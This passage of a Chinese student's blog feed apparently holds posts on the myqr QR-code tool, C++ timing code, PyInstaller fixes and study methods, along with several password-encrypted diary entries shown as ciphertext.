        <content type="html"><![CDATA[<p>在逛github的时候看到的一个有意思的东西，可以自定义创建二维码</p><a id="more"></a><h2 id="安装python的第三方库"><a href="#安装python的第三方库" class="headerlink" title="安装python的第三方库"></a>安装python的第三方库</h2><p><code>pip install myqr</code></p><h2 id="一些参数"><a href="#一些参数" class="headerlink" title="一些参数"></a>一些参数</h2><pre><code>-n：生成二维码的名称-p：二维码加入的图片，支持.jpg、.gif、.png、.bmp 格式-c：选择是否生成彩色二维码，如果不设置默认为黑白-v：控制边长，范围是 1 至 40，数字越大边长越大-l：控制纠错水平，范围是 L、M、Q、H 从左到右依次升高-d：控制输出二维码的存储位置-con：用以调节图片的对比度，1.0 表示原始图片，更小的值表示更低对比度，更大反之。默认为 1.0-bri：用来调节图片的亮度，其余用法和取值与 -con 相同</code></pre><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p><code>myqr https://github.com -n mypicture.png -p github.jpg -c</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>算法计时方法</title>
      <link href="/2020/CS/calctime/"/>
      <url>/2020/CS/calctime/</url>
      
        <content type="html"><![CDATA[<h2 id="总记"><a href="#总记" class="headerlink" title="总记"></a>总记</h2><p>算法老师要我们计算自己编写的算法处理数据时的耗时。<br>网上找到了两种方法.</p><a id="more"></a><h2 id="c-函数"><a href="#c-函数" class="headerlink" title="c++函数"></a>c++函数</h2><pre class="line-numbers language-c++"><code class="language-c++">#include <time.h>start=clock(); sleep(1); end=clock();cost=end-start;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="系统API调用"><a href="#系统API调用" class="headerlink" title="系统API调用"></a>系统API调用</h2><pre class="line-numbers language-c++"><code class="language-c++">#include <windows.h>double start = GetTickCount();Sleep(1000);double end=GetTickCount();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pyinstaller打包问题</title>
      <link href="/2020/CS/pyinstaller%E6%89%93%E5%8C%85%E9%97%AE%E9%A2%98/"/>
      <url>/2020/CS/pyinstaller%E6%89%93%E5%8C%85%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ol><li><p><code>UnicodeDecodeError: &#39;utf-8&#39; codec can&#39;t decode byte 0xce in position</code><br>解决方案：命令行中输入 chcp 65001</p></li><li><p>超出递归深度<br>解决方案：在spec中添加</p><pre class="line-numbers language-py"><code class="language-py">import syssys.setrecursionlimit(100000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-4-25</title>
      <link href="/2020/diary/2020-4/2020-4-25/"/>
      <url>/2020/diary/2020-4/2020-4-25/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误！" data-whm="文章校验失败！"><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="请输入密码：" /><label>请输入密码：</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="a4aeb6f1713f4f83516db739ca9077b6d06434d7df46941cdf6cd831579c7e80">cb4551c676471b747c15969945acfbad274cc311cb7f7f29508d0a9d35cfb139f189fd286e1efc64bb18f16a62d049f7e3c2771a640aaf0d347c4383a1dd1d7537e1f952ecafdbc54d99cf7589d0c9431346b7d847751a122e0fdcc42102fdc5154425a9a20ab47cdef47669c3ee025be70f89bfdd0afd56e5e859688d4223d2cc8bf29edbb5f2deb59d70d93d48d644e5b924bbf210c263ea16afc70de976c34d4d578abaa4f6a2ed8bcee06e3eb1f5e1b632691decd68a93975b70b757ff182d024288e4b2e0c0e3fcde902ab2c770b8a17bb52c6079fc3fd15daff1a7afb637126b25b6dc697d6295c43a4c993225293b79bea47c6efdacf54dc3ba0878de09e5ecd073dc67390c135d854517714345307f90de4229947ae1a1b796b4b977da6b736db5ed71e07136e493f12a5e668d124f136dd1fd12f971ce40efc5f71973698f0e16cb2edfabfca047d6387c1f67976707ca40d574850aeb5c38ab28f90b8980f628fa69fce44978a8bdb98dc8478a10c56f9327d32c3348bd5acf15f0cf157c52dd6560bef021e10aafa9a59f0bef6289e6feeb0a0c7605128c2d77df5cce23bb00f5eea6109024c5c46595ab0e4132feceb137b75ba9f98596b0a1ed569584c5ad26f064d95fbc542a78372a90dbcf5c2a7968b46077a12e0191c768dae585120cb7911a068f311ba630f4cc04502a9b3923f8831f4ed4192a2fc6a97d7c6678a051c4b08baf7d882b53976683b176fdba81ee0d536126ae417795e667448725f88c83c4cc4fa5483f085f257346ca1661e6c34b0ef444ae229382fe80fe66edd4ec11d8e4f5f8d10820d22a34d39abbd055baad837c4473110b684ca9cc4214ed998faf9d1f710a93b2c221be1d8b8072cc5586bd0c032e3c8e60e6dcdac18beb41d4a91edcc56b8a94cef6abb777115667c1616ca8d1e84051d839d12c58e13a5d88772f15a36555cac74b1b6b353e5fa86effdcd3765bf854297941155dddc7fa440df42d93ccc25ab48dae9cba13896329a1dcb27727d88489d37f75a942320c79d89dba912bde55966a36a846457c43356171fbfadc4fc47bfa74151ee050961b90d591ca9cec319ac075e0b5873a425fc02d600dd599357c3325cfc4e1902fffbdc9e6b56cce04b2aeb515b6fce578364cddd73cbc5db95d852922420d171d46e158ab47e9ca68003df72757290b1c0335ed8797d717793a6d50ee2c7df99f730bbe12eca69f8ef193c62c3524f3e16c37bf6cf8a77a8ac7e61dd9e8017f69287de036f6ca2f6d42107a7f8338ee5c51039dd8fa90bb28892976eb7ed9f9d63b343aee0ab0d4df416ddadfabd68f270739778b05615c0601545290df3c77afa186e7edebc64fedc6746c1448fb4c552a3c6c3005db63b9b796f9d5dff27e875cfcd1854522619ba20bd866e976af0004e49cf669c08f29188548ecf0d6e0038baddc72e634230442bfcabb4dcbf0df5c16be216991a97e647d83bf943a30bc805230142a2870d873f246487ae99a62c14528e866e249d85b6d456507cc9d4ed7daffa8b341514ab32c17087f2744514d908844133e31ce65c30bfd51aef00daaca22351440a2415287</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 杂思 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂思 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习方法分享</title>
      <link href="/2020/learning/share-my-method/"/>
      <url>/2020/learning/share-my-method/</url>
      
        <content type="html"><![CDATA[<h2 id="总记"><a href="#总记" class="headerlink" title="总记"></a>总记</h2><p>这篇文章将分成2个方面来分享。  </p><ol><li>做笔记  </li><li>平时阅读  <a id="more"></a>  </li></ol><h3 id="笔记法"><a href="#笔记法" class="headerlink" title="笔记法"></a>笔记法</h3><p>高中的时候，学校不让带电子产品，就老老实实的手抄笔记，其实纸笔接触的感觉真的很美好，尤其是在我用了ipad做笔记之后，就越加怀念了。<br>为什么到了大学我选择用ipad做电子笔记呢？<br>总所周知，大学的课程不仅多，有些还水！想当初刚进大一那会，还是买了很多小本本，本来想好好学习，记录笔记。却不想，每一本都被我糟蹋了一点后就不用了。<br>而且电子资料很多，如果只是传统的打印，将会又麻烦又费钱。想想每天带着大部头的书去教室，如果再加上厚厚一沓资料，真的内心崩溃啊。  </p><p>在大一下大概6月份左右我入手了ipad air。从此开始了我和它不得不说的相爱相杀的故事。<br>我直接app store里买了goodnotes和notability，现在在考虑入手marginnote3，但是他真的有点贵，对于学生党来说，不是怕买不起，而是怕买了会闲置，浪费钱。  </p><p>目前，我挺喜欢用latex写笔记，因为很方便也不会因为格式、对齐、缩进浪费很多时间，唯一的困惑就是同步不是很方便，有些地方也不是很方便，比如画图之类的。<br>而印象笔记文字的编排挺难看的，比word还差，之前看到过别人的评价“印象笔记是个书架”，所以我觉得做笔记做重要的部分就是，不要被软件所限制。<br>就我而言， 我喜欢印象笔记的同步，latex的排版，以及goodnotes的手写，所以不妨将三者结合。  </p><p>一些需要同步但不怎么需要排版的笔记（如读书笔记，影单，书单等）就选择印象笔记。<br>一些注重排版的（比如我的英语笔记）就用latex，写完之后将pdf导入到goodnotes中更加方便做一些增改。<br>一些需要随手记录的东西（比如上课时做的笔记）就用goodnotes，因为ipad很方便携带。  </p><p>说了这么多，也就是想要你们，清楚的认知到，我们做笔记，是为了更好的吸收、转化知识。而不是仅仅为了作秀，再好看的排版，没有实用性，也都是毫无用处的。<br>所以说，写blog才是最有用的，每日复盘，反思，不断进步自然是最好的。  </p><h2 id="关于阅读"><a href="#关于阅读" class="headerlink" title="关于阅读"></a>关于阅读</h2><h3 id="英文外刊"><a href="#英文外刊" class="headerlink" title="英文外刊"></a>英文外刊</h3><p>关于阅读方法<br>1．首先通读全文，不借助任何工具，进行纯英文阅读（遇到生词和读不懂的句子先猜测直接跳过）提取中心句，把握文章主要脉络，了解作者的主要观点<br>2．然后第二遮再勾出生词、短语、句式等等，这时也暂时不要查字典，遇到生词尽力通过上下文推测词义，读懂多少算多少，不影响理解的词可跳过不纠结，切忌一遇到生词就查，依赖词典很影响阅读能力的提高。（基础好一点的同学读完一整篇再开始查，稍弱一点的同学读3段之后再开始查，总之一开始一定要独立阅读。）<br>3．开始查字典，看看单词都认识了还有哪些句子是读不懂，可以自己先琢磨，查语法书（一定要有意识地培养自己的自学能力）〈扩展不是越丰富越好，要看自己消化吸收的能力，量力而行）<br>4．重点关注你一开始没有理解或理解错的地方，并仔细分析背后的原因．生词？固定搭配？熟词僻义？逻辑？复杂的语法结构？<br>5．消化吸收完笔记后，再读一遍没有任何标注的原文，从宏观上把握文章结构，提炼总结作者的中心思想，学习作者的行文构思，总结思考作者是如何开篇，主干部分如何展开论述，最后如何结尾，而段落与段落、句与句之间又是如何紧密衔接的。<br>6．第三天复习回顾笔记中的语言点，巩固前两天学习的内容，并完成回译练习。如果学有余力，还可以进行做summary,paraphrase,囗头复述等等练习，好的段落句子也可以背诵。<br>7.读熟文章后，可以将文章音频下载在手机里，利用碎片时间练习听力，磨熟耳朵，听力基础比较好的同学可以一开始先听/听写，再开始精读。  </p><p>宗旨<br>主动阅读，主动思考，主动提问。<br>每个同学的基础和目标不同，跟着自己的节奏走。  </p><h3 id="休闲娱乐"><a href="#休闲娱乐" class="headerlink" title="休闲娱乐"></a>休闲娱乐</h3><p>这个方面，我平时阅读用微信阅读这个app，新用户和学生都会免费送30天的无限卡，可以免费阅读。<br>还是很不错，很多热门的书都有。<br>目前我觉得很舒服的阅读方法：  </p><ol><li>在微信读书上可以免费看书  </li><li>将你觉得比较打动你的句子划线  </li><li>阅读完整本书之后可以导出（也就是复制）  </li><li>将复制的内容粘贴到blog中，也可以做一些点评。  </li></ol><p>之后查找的时候也会很方便。既不用抄书，也不会花很久时间都找不到。  </p><h2 id="一些好用的工具"><a href="#一些好用的工具" class="headerlink" title="一些好用的工具"></a>一些好用的工具</h2><ol><li>思维导图：XMind，幕布，<a href="https://www.processon.com/" target="_blank" rel="noopener">processon</a>  </li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习方法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>开启blog</title>
      <link href="/2020/diary/start_my_blog/"/>
      <url>/2020/diary/start_my_blog/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误！" data-whm="文章校验失败！"><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="请输入密码：" /><label>请输入密码：</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="3dad987b64139c1a633eae11b2555725b97e46cd4007fcbc44fa68379db0197f">a49b62c051f85285fe1169fc4cadff5ca8cda93754002ecc548c1b6c65b7d219cf96fd9674c3a4a9e0f379a7eb6ce1f3a6185a6add02ba3fd82a125af3c7fc10b2ab69b935f3eb99896c5309d88893b7a2ce7b501e1746f11c95b08148907d4b3afda7cd12d69a3cd528a713901914650730aeddd5999137d573525a47dc7bd96235ae4aeb3078382b1dbe02fe181dd5376cec487a6b7ce1a224c3834963443957d47105936c0ef4e5db1ca17c691d5ee13185408d93125294f1eea4cfa54038c6fd77bda892937039343c23242d39c80adb5cc4f819febcfdc39fea62b6661a9918d4432691cfbeaae6ca9fc5c3bc06bb853c995ca15885e7b77260e8f2a21f1ef0a2b41a1fcf9706ddb74fc62988164c9cefe8deb3f0b310975912d7d1ce303833102ca7bcb0af3c6b919f0121d6c837e3db8777d335b4ffae6637271a3ca08f77f7ba73ea5f0c55e0fe5ae0fa9dfe884a03bf45ef90ff40fc9cbe940b11adac34cca3de467793db93e1eda2d54a28a12a181436db430abbed6821404be8a35f3788d98f1d44b4398a24354ae3a1475d6b97940586706c4b15f24628e68069c685b6b6313b32d116aebca396a5c12e2277b0a439bb1d976aec947c1bb3f8fd</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 杂思 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂思 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于推免的要求</title>
      <link href="/2020/learning/%E6%8E%A8%E5%85%8D%E8%A6%81%E6%B1%82/"/>
      <url>/2020/learning/%E6%8E%A8%E5%85%8D%E8%A6%81%E6%B1%82/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误！" data-whm="文章校验失败！"><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="请输入密码：" /><label>请输入密码：</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="e40b2e2e9ff1eda7c1f37c3e22ab6bd07e5853984277628408e672f4cddcb92e">9f4551d8c3771008c05fd314bc0fc327b0bbfd4438a90d67b540dfa5ab88d6fc67113fe482b1f44e44c56c425913e1c488f030f155c761edabedf737d6e010f3ea9b8d1305b6c06030b40f0e2e0e4bc68ffbdb6cab4e085e7b4eb25ec0be008d7823173d8374ea6e73a33202a98ffe91e6b189f68fae2d13e4d6f1344305bc26cd68b85af0784494d06a0a2388fc119f38b1f285afded5c1a3db6b512f34d36f825b67ac73b845d82ea78fb4602acea3368c6a6a83b085a2ae755c7cb50b850ae419460ec9a75ccfd9c766a6ce0c2cca4046a84124d8b4c9dc19888343f5be9addc720e03478f20894ff9b86f92de1326d122db805ab72c0f5428c706680116405c9c314d2c99125d4a1e1cd3a0eb8b6825982cfef2a4448ee6252ef9408a2be001cd614d766305328480644fa9b954f695e8f788ee7a95756d8edffd6a716f455263d5c487ea1c6869c8b8c45956aeeb2bcd4211eb1b0fdd22c309fd84d5f6cc498990989c8eee8e63914ab6fb599b70fba6ecf75778a1416e65be52e6a987aea7d2730a85c0c36f1ce49986361ccb7733a70f5f66a84d31043cf7edb7fbe410f9c883172a78a1725d7fd53ae9241459420ce3c30271e7538edc90b4d1ac8ff33eb927f80e761b22e16d4f6fcf8e90be90ec000d8456a2ae575cf86eff721144426d4baea948ca0c0e4ab6ff0b65a22c1a6784fb07f72bf5054aa7ea6f0c4eca2b81d28dcd8bc1f4bc6bd37fd08722d95d4c22bacf18a8bf97e4c372eb026dba8d18ba4be85ec48e5158aade5176dc7beeb7f2feaf87618fe76706a0682bcf3cef422fad14a2cf5fd48c08521d789546565ce999863db1c21754272be4041929b7c7801ff389a93f72d4c570e44b4d5134523a5138157ad42054ff0f4e2452cdf34803a69e6062237f99e034fad079d84e4ed70efd855156c3d3b5c39a07000965d555f3f262da114ae6b72e461e6fc23857b29d7c778558982958c6b57de55fe9080852b5cb3a79247e3afdaa5e78b5c91d16c8837c51a486939e8664a67946ee981d89ecc08aff170106f64f8ef4462b1a3e7a7430ce805772038842ce5bc29141972d58ac7316a5b947787bbaa06f69d4b3d4df70540d75e8bb68915551590b405be464616f36b16fb6f91e42c0dfaaa4c9aeb9f0c6e7d564e4fe5ca14638765bb31705ed5bbbb3b07db34e94de2a814d6b63f11217801da329313d17d4a8a13a8df84f09968d67711c5a18ab1989236f9cd647a02eca958d9997125ace8ea77ccb70d393f26ab4dabef5b32784d4db5327aa1e972c3ced202730b0272023ecb415c71ca851b858e8d756fcfa37e503792744585806da54259332cb1cab2276165e59842864d96a993d575e10bd306e919f2f11ecb5aa739224b996a4b62db7ae39f19e24efe47e0efe16511fc37dc3a25c2ead670ac0d89be7d48551e4ca8b42a6945ceb1fdcd68e36c576c272802941cabb11d0247bad5bb8a837cddcae29d2234d4a1bc8809310e31ebe1298db83b5d3c3945b48cc2085a396889776ade54794b38ee2a6f03f34db8b6bdc2d26d9a7a03b927f2b9dffb4ebf51a90c11d543b2c39b5d590a20a07efca7b0e67165ae2b880c2eb40be97497fa5645d58c7cbde5e6152de4e168a19a8ae2c937606c498bcaa22dcf316f6fb21380d02d4db75ae8444a2699010251690dfbbba61bc249fa8e8866a7a524e71c5785afc24ff7a7fc4cf5293ea31a4aa8bf7c66c507000e97bd42c1f826cc58e4bc046156ec40d8d8bbeba067e06f22b124358d3ec570939d1a10393a7ea9fccb314370e2581833e57e99f93f1a2417e6a70ee9faa04b9f5e39aaace2947c70dd9c2e47262502eab7daa5b7b954ad57ce77d9671623a38153b7ecf8c552e7724991173bff10c37e8d71261b71bb148073a34e74192ff7110df5c83d4df625e37313d08767884df9430abb810d87d7bb9a07bbb70d3fa3003500ec37323af634cf955920fdf64457d41cab6c84cb2fe0aa9d59f926d32385eaae846cb811b84a268249113b54d5798f0e6fd43c7c72170416bef9f671104a25cf16cef52b5ad4dabfa5bea3d24f336747f16b3d2af56b77222c124645b2ce6678f0838bed3b52736f6a29d17df44d2880229ce4b648580628a7993b3351e6b8d937c5a590d5102ebdc7ca7b2cf43500e5881fb77af9e403d73341ccb83dc0871e12716537a578619fa41d09237964d7548eaf1d4975748fb055ddd482c4a9e9c5084b207b2d40a5d1e17c7a285e35114e94e7ebc818540c81cf3431d55f8f009be2f0efa95afa88df21594f91378da82695d9d07b47ea73d36bf3a26ee59277d48560e5dcb55aa47ba9a9d1e01657eef3d25a2f70761af5697e3dfaf2ce75f351cd2bec6898dd06c596b5bc28b92372eca4626d01619ffe32b20f5bedcb91d6269c6c2b4b5ac214a91836d1fce58c779792e44f123219c87009c0bcc9f61132f615a0ae257b76fe7272f4652ccefba1c4da0d0ca0db035ffae3c803ba7cb2ffb2d24619cd42e1f934edbc93ce46ae8b81f207b7a91a950f7e75969a29e8b6416aff3dfcfed0ebe40abcae92816f808f861da0899c76a8693440cb3d92e45be2b44fe49a0f52638502a2734f4045ac2e457228e29d90c98ef83f02de31454663ad4ba51d2f6da7f83e4b04636e8f87fe87c65380709200071ce0ee3537f930b8b8f7e0b96c16818488bb240bccfa7122ba33031f1de45f7936d2d42a86b2bd1ec32f57e023e75583378823c25b6d0932e5450627fd8d5945a03ecb588c33a0075096e65b6e134d967e0b9345b6566df1bebe410c2fd53cd29d996b77447d28ffb0ffec659836fd045c27b44fa9ba386d04e3fe897c388af2b5cc4a967909eabe07aaeaf43cdfeeaffbccdce172b719987db365b36eb26b116ac2336ec6a9d627c3845c62bfdb71212e2fddf4d5048144690211965975cac301d0d8006b3358fdcec48df82bbe3d8386e6853c61b273490520b7a8bd28a06301b35520bf6cdc47ef40c1a73390659673cf76ee1557b59021274025aa0b24b4f310c14786fa174f1ffea8610bc4484e81cbbc3003f5adb7e758051c7baf1139d9bb71db1a99e38fd3e3b77ea7032f36894edba69f</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 杂思 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂思 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-4-23</title>
      <link href="/2020/diary/2020-4/2020-4-23/"/>
      <url>/2020/diary/2020-4/2020-4-23/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误！" data-whm="文章校验失败！"><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="请输入密码：" /><label>请输入密码：</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="4a6ac276c31c5aa9f9511facc75ac1d9e60c43dcf5504d6e39e0ce4a76d1b95b">e32c27e47419b87d293b9e8ce412adf84cdbdb8bb07d6caa7a92ea6f119080142f73b161cb7b54e53123f39e6b6ae83a2d09e64f60521bf2e03436e25efdc7b65d4f24b9c03dff003f41da7d14359df633eb0a0910bd8b7e6f05d284be5e7610dc3ac5783d92ab60281c7805e49898bf330f5dd1b8badc9a43fdfad399f852ba31fa7a4c1ddb0483e732ea75baa7eef708156786d56dd2ae4d838aa00256027f09c87779edcad1f3b103e2a3605387f77645bdf3f13d52b8de449c6e21d0a54d1dcaec19e908a87dcfdd0d173c8951ab7d8c40e9cc6ddcf6eb52cd0a96453f7721e6107cb22696ab36f17b6b80dfbbfca2671228424e4bb9065e6785459285feef7695e880c96049e4577216c7a461d241ef9a946b6bf6858a2a7cc6d427edc49e2e7278175927d5173bbefcf06b4c71df21068763322b625f15083efcbec9887e913e39c6b861c7549d2cda169599590b97adc73dd58e26e571df23898ae4fc3ce2e1746e3abef8de648cd0e5b5bbf01b42eaa7420e14e6dc6013801391ed42c34e0376060386898819aee399beb62e47c8d79b4446d019e5794c5ae665f3eaddc0d569080d7cb9d785b6bce52175471e81a24d6aa6451769b3d7b2281d092fdcfe51bafed878179f5806c863c797985c295256d907300327a3cc76479858f0365a86cbe7ebe7f022716542029975d030803fde35f5b813f89db446090d9400687c10da61735692da5e1591e448fb09fe46c0c0e7ee57cf87f65e549d9b9a8b8b7c4ff10694fc4e6b9a6265dbdc20fcd31303b03b492765f08e3ca74549983df494b0a15e5773d8d965803ec2ab9a099bd90fc44a508568a333928f4d1fafb72f5949bea2ee1a852e5a8a4a89052b48e1f53fc3e7676235710e0b8c4a427bcef2102d10cb80f752101ae90ba6675b3de05db68adc66b9b29baa8ba85985dfaa119521a11cd1b1f3162343d4585881d9f28c32969a11cbd4d79444d1338889fb76f54acb5d83f6abc22ea236dad816646358c72bfef422e5254f31d171577147ca7d99891481fa12fede2b175872ddf69fb4fb7f1d215a2413065210e12d02ec22d5b85d4c39b183b0a3a5ef09f48da2d30b2c4af8d896748e936f18bfe22bf9c6a9bc4698e9670b63618125b513e31092da49c0fd36ce38e98810801150f015e0498ac96b97af704a7d561cec4a5efd5557cf8b9ac29997165d9823b1ac7b141a4d72dc8b73a6116c2debf5406c01857e3c4cfd643510604d9d12e4467fcd8d6a799327a5f78b3285dca55b11f376bbc5f9fa2d13504279a2a61f8d512ba812826cd307c2fedae51dc4b1f37a45235f261ac86430a8cc92bc829114863f30623e6da7e87fb913500c759c95b46ec734c6f3389f73feaf8a66ca1695bbf78f9e78691fa3f22a587f6fb4b27769b0a5cbc00e9ddc9f9ab094f53d41544e8e4dfb2e5125fc218936287c8d374c22d17057f0648ef2826e33cb8276f10cc82f6e222524e8742146911256682a5265675682d754fcb74ccaf81b4675e357360676b71eb6d43067c7b778635f157f8a04d3330988b60532711015f755572301b5f18987ca7228d8c074cc95c80a74f75383c14b19f746995fcfb531d3bcce6779797d4f281355cd12fca74c1bfa03d68410b25599eeeaa082d05b087ccac5b49fa9ae5d4c2774a26a3641b906eb081c8e081d</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 杂思 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂思 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-4-22</title>
      <link href="/2020/diary/2020-4/2020-4-22/"/>
      <url>/2020/diary/2020-4/2020-4-22/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误！" data-whm="文章校验失败！"><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="请输入密码：" /><label>请输入密码：</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="9cdd797ae1579e2ccbd4d5921e0daa3a4c05649ac8060cfc3199dd86e8d3ebd3">e32c27e47419b87d293b9e8ce412adf84cdbdb8bb07d6caa7a92ea6f11908014009c17ae053a54804792e0b71371aee719fece2aa021d88d35123be88d7761a0de2c9af6241a282fffec4face6111abfeac5f04eb8ecbbc487fd2338fda1a95e311fbbd046c15963cda2114e9d79ca31c84eb01ca6c65d708f2b5bad61735e40598a0d3595a622711e83d08d79ac0cf509af3ce63ac2d6eed1e65c213670d6ba4d96aedbdd79a96351b509fe8b6151347057411a9d1f2621d0687d3be039f25a0a5c0a442de6e0cc1a0629873db6c4849ca57be5cd2099c1a7ee2421c303cf87d29b41cf955e0fdade31b30158a46a451d9deb283d3c4a4978850de447d5daa4bf12172c2a1a5dc5e64a30621a165ff79cc92aae6a037b3cff04a851d918849d5fbdd5c8fa0a7d916ba271d642bfebf04e15ed59216869191ed5f060c7407bde6470cb0ed0672773f92e7e327b32543bbb4912b5dd329de449b545ed5392567278866f4a077bb6ffb0774e5433a097faabdad4db6b9b42fc2aac9ba2c8a6a2e7133e513b06f508db79d3956885b494f4915a19291a5aeb0a63bf595689888c192abd585f99cad41a8fdf8ced78a8916131e149a2096d011b647ac5c862a6b12d12e24e6101c5c985b9335e179e5f2045d17b208f7a9cdf886b35bd32674c95226c4a13fc17954f7c6dac513fe2cce1165d30f2280d03536fb0fceeaad7ca697282b2085b9e6824a5ce79b449218fd2e44c1a4374a4803d672f611db43622542aae94e04b0672efcf8dad84a79030fcbaeefeeebf703d22fa0af3b6ac34b196c177456faeb34d738a4dc7c42b46659002167227ee35588ed59bba924d88b922adc81a46aa6aaee7f7c45e8e4ce954a6e60ce346b8a30b9eb15699a904610e0408eb05c25f2fc81032702f7a1361e5b725933bb58ea3f538349192e39adf6a508673fd8756684369634e41b76240cbb9cc58730f93d60f5d11d9a6db5464187775f554eab5d1a7fdba93f44863966cf415870db93bde01a758bd43bf73f2feaa77d06470fff3652c66ac33210d517219e1f1cf5fcf4f5f23e89237c2c61c6ddcc2c75f71c8e94d0ee2b486206365e4dc5fcd9a25566387c3df1c62fad0dcb14a61f9c666e61f0230bf072df043d64286e3577b3f012b54a24b8327a2e91b21747d3b916f94db6c7f7d8aa471cb5eca05db5051cda9e1167be8333c8e8ede5981e877faf765d75d24a958b5fea73953905ba99917d28d7b532f915143428f23085a23c73d12360695adf377b192bfce5e2a21459cbb0f6aaf4f42d91a6d094903399cad095e5d610027d6b15cdfec611b65460cdb29d70310f272b48885068c61cb71f4c07f055bd8d91ef24f286318cbf8adcb2d7e398c80538137f4324dc6d37fd0056788c6a0ad561d3158e252b1c1030eb268e7c7279990002f0c257c555273ef2dadb9bb111978a426edfca18f3c522e99b6904ad5eb5cf1cd5448f1734426498695118adb3a810530eb0cbdada8c4baf6df982298d4b9b058af177520552d426be7481a4952787e97a0098824186cfcaae8d66c506bba65862c535985e62f82d8ec1a54e6289929d6f588f9fbe19a62d9e5502b941c5eea8ae9879a15ddbe8785b892d4b6831bb20f9d8bf4f3a626e89b3f520819d53f1918a9a42a5cf9cd10cba0b124ea1665bc6423d8470ea2ce2370a3687545aeebcb8b6c14474d44ef5d2821156262dea60c7810899767baea14bf38b1544228c61bec9f17ff5aef82370f3a640a4f17277fb52a14f814a13482be083cea592885779264e7e04ff876ade964bf119a39f8e72608ff1c959487363939e77046c1039194f0efdcff357a44f6c0f079364ec06dbb6256c823d715c92046eb804dd6af0e2881d3ae162ff3d460654ec4d865b82fbbcd151ecd328c242aeaa8e5b43b0a5a022ddc11fcce07b316a5c598bf0e646773c5b9b8da8d894a664036b1dda165f0568e5f2fcab048c48c6a8a4c3dd0ffe214abcb664e1b085c15655dbcf3da3e895c288f7a903fc39664ec1a6715af85f1673f5a345d1efa19cbbbcaf38a774c6686869861e7514912009e18c7f8ec47908510217b25bebd6f953c3fb1177be51860325b3def1bbbc5ed578c9e40ca03cab88369ff55c7bd582ccb1f4985de3935dcb06070ed42ffe270c0147962a51a0b9568b423c423cda80e9cd6ef17ec9c25f530d3c8951fa08e23e07c662869016036e85e3819ec17619eac9a82e3b9f81c2a175395394be6ab260d508b2a4844360ed99b4f8ba529c1544594e9956cb26c68186b1868fb3430258abfd492f0614cf2fcf961ef49ffa27061c5d26a1f4fd701a406f7aaba85cfcc0144b801979f5e8227076f4597b4607bdc1f5e604860a3af4060d34a66e2ea7a7a26ed438d77b279b7d2029353472e04eaaa7d6d172baa1a9a45d7777727</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 杂思 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂思 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《世界尽头的咖啡馆》 约翰·史崔勒基</title>
      <link href="/2020/reading-note/%E3%80%8A%E4%B8%96%E7%95%8C%E5%B0%BD%E5%A4%B4%E7%9A%84%E5%92%96%E5%95%A1%E9%A6%86%E3%80%8B%20%E7%BA%A6%E7%BF%B0%C2%B7%E5%8F%B2%E5%B4%94%E5%8B%92%E5%9F%BA/"/>
